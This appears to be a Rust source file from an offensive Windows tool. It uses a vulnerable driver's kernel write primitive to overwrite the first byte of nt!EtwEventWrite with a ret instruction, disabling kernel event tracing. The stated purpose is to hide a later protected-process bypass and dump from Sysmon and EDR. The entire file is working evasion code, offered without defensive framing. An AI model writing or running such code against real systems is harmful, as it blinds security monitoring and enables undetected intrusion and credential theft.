//! Kernel-level ETW bypass via EtwEventWrite patching
//!
//! Uses the viragt64.sys kernel write primitive to patch the first byte
//! of nt!EtwEventWrite with a `ret` instruction (0xC3), effectively
//! silencing all ETW event logging at the kernel level.
//!
//! This is performed before PPL bypass to prevent Sysmon / EDR from
//! recording the EPROCESS.Protection modification.

use crate::kernel_rw::KernelRW;
use crate::ppl;

/// Saved state for restoring EtwEventWrite after dump
pub struct EtwState {
    pub etw_address: u64,
    pub original_byte: u8,
    pub patched: bool,
}

/// Patch nt!EtwEventWrite with `ret` (0xC3) to suppress all ETW events
pub fn disable_etw(krw: &KernelRW) -> Result<EtwState, String> {
    // 1. Get ntoskrnl base address
    let kernel_base = ppl::get_ntoskrnl_base_ntapi()?;
    println!("    ntoskrnl base: 0x{:016X}", kernel_base);

    // 2. Find EtwEventWrite RVA by parsing ntoskrnl PE exports
    let etw_rva = ppl::find_kernel_export_rva(b"EtwEventWrite")?;
    let etw_addr = kernel_base + etw_rva;
    println!(
        "    EtwEventWrite: 0x{:016X} (RVA: 0x{:X})",
        etw_addr, etw_rva
    );

    // 3. Read original first byte
    let orig = krw.read_u8(etw_addr)?;
    println!("    Original byte: 0x{:02X}", orig);

    // 4. Patch with `ret` (0xC3) — function returns immediately
    krw.write_u8(etw_addr, 0xC3)?;

    // 5. Verify
    let verify = krw.read_u8(etw_addr)?;
    if verify != 0xC3 {
        return Err(format!(
            "ETW patch verification failed: got 0x{:02X}",
            verify
        ));
    }

    println!("    [+] EtwEventWrite patched → ret (0xC3)");

    Ok(EtwState {
        etw_address: etw_addr,
        original_byte: orig,
        patched: true,
    })
}

/// Restore original EtwEventWrite byte
pub fn restore_etw(krw: &KernelRW, state: &EtwState) -> Result<(), String> {
    if !state.patched {
        return Ok(());
    }

    krw.write_u8(state.etw_address, state.original_byte)?;

    let verify = krw.read_u8(state.etw_address)?;
    if verify != state.original_byte {
        return Err(format!(
            "ETW restore failed: expected 0x{:02X}, got 0x{:02X}",
            state.original_byte, verify
        ));
    }

    Ok(())
}
